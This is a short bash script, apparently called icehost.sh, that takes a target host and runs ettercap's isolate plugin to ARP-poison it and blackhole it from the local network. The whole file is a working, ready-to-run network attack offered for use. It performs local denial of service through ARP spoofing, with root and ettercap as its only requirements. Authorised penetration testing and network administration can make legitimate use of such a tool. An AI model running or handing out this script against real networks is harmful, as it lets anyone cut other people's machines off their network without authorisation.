#!/bin/bash

# ARP poison a host to isolate it from the network
# Requires root
# Requires ettercap


# Variables - general
version="0.9.0"
updated="2016-04-09"
author="vocatus gate"

# Variables - script specific
target=$1

# Error checking
if [[ $# = 0 ]]; then
	echo -e "\033[1m Usage\033[0m:  ./icehost.sh [target to blackhole]"
	exit 1
fi


# Execution
echo
echo ARP poisoning $target
echo
ettercap -i eth0 -TqzP isolate //$target// ////

